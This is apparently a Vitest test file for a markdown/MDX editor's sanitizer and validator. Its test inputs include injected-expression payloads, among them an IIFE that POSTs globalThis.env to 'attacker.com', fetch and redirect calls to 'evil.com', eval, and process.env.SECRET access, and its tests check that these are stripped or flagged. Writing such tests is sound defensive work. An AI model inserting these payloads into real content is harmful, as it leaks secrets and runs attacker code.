import { describe, it, expect } from "vitest";
import { sanitizeEditorContent, validateEditorContent } from "./sanitize.js";

describe("sanitizeEditorContent", () => {
  it("preserves normal markdown", () => {
    const md = "# Hello\n\nThis is a paragraph.\n\n- List item";
    expect(sanitizeEditorContent(md)).toBe(md);
  });

  it("preserves code blocks with expressions", () => {
    const md = "```js\nconst x = { foo: 'bar' };\nfetch('/api');\n```";
    expect(sanitizeEditorContent(md)).toBe(md);
  });

  it("preserves inline code with expressions", () => {
    const md = "Use `{expression}` in your template.";
    expect(sanitizeEditorContent(md)).toBe(md);
  });

  it("strips standalone JSX expression lines", () => {
    const md = "# Title\n\n{(() => { fetch('evil.com') })()}\n\nParagraph";
    const result = sanitizeEditorContent(md);
    expect(result).not.toContain("fetch");
    expect(result).toContain("# Title");
    expect(result).toContain("Paragraph");
  });

  it("strips globalThis access in expressions", () => {
    const md = '{globalThis.env}';
    const result = sanitizeEditorContent(md);
    expect(result).not.toContain("globalThis");
  });

  it("strips IIFE attack pattern", () => {
    const attack = '{(() => { fetch("attacker.com", { method: "POST", body: JSON.stringify(globalThis.env) }); return null; })()}';
    const result = sanitizeEditorContent(attack);
    expect(result).not.toContain("fetch");
    expect(result).not.toContain("globalThis");
  });

  it("preserves simple prop values in expressions", () => {
    const md = 'Value is {true} and {"hello"} and {42}';
    const result = sanitizeEditorContent(md);
    expect(result).toContain("{true}");
    expect(result).toContain('{"hello"}');
    expect(result).toContain("{42}");
  });

  it("preserves JSX component tags", () => {
    const md = '<Callout type="info">\nSome content\n</Callout>';
    expect(sanitizeEditorContent(md)).toBe(md);
  });

  it("strips eval expressions", () => {
    const md = "{eval('alert(1)')}";
    const result = sanitizeEditorContent(md);
    expect(result).not.toContain("eval");
  });

  it("handles mixed safe and unsafe content", () => {
    const md = [
      "# Safe heading",
      "",
      "<Callout type=\"warning\">",
      "Be careful!",
      "</Callout>",
      "",
      "{(() => { window.location = 'evil.com' })()}",
      "",
      "Safe paragraph.",
    ].join("\n");

    const result = sanitizeEditorContent(md);
    expect(result).toContain("# Safe heading");
    expect(result).toContain("<Callout");
    expect(result).toContain("Safe paragraph.");
    expect(result).not.toContain("window.location");
  });
});

describe("validateEditorContent", () => {
  it("returns empty array for safe content", () => {
    const warnings = validateEditorContent("# Hello\n\nParagraph");
    expect(warnings).toHaveLength(0);
  });

  it("detects fetch calls", () => {
    const warnings = validateEditorContent('fetch("evil.com")');
    expect(warnings.length).toBeGreaterThan(0);
    expect(warnings[0]).toContain("fetch()");
  });

  it("detects globalThis", () => {
    const warnings = validateEditorContent("{globalThis.env}");
    expect(warnings.length).toBeGreaterThan(0);
    expect(warnings[0]).toContain("globalThis");
  });

  it("detects eval", () => {
    const warnings = validateEditorContent('eval("code")');
    expect(warnings.length).toBeGreaterThan(0);
  });

  it("detects dynamic import", () => {
    const warnings = validateEditorContent('import("module")');
    expect(warnings.length).toBeGreaterThan(0);
  });

  it("ignores dangerous patterns inside code blocks", () => {
    const md = "```js\nfetch('/api')\nglobalThis.env\neval('x')\n```";
    const warnings = validateEditorContent(md);
    expect(warnings).toHaveLength(0);
  });

  it("detects process.env access", () => {
    const warnings = validateEditorContent("{process.env.SECRET}");
    expect(warnings.length).toBeGreaterThan(0);
    expect(warnings[0]).toContain("process.env");
  });
});
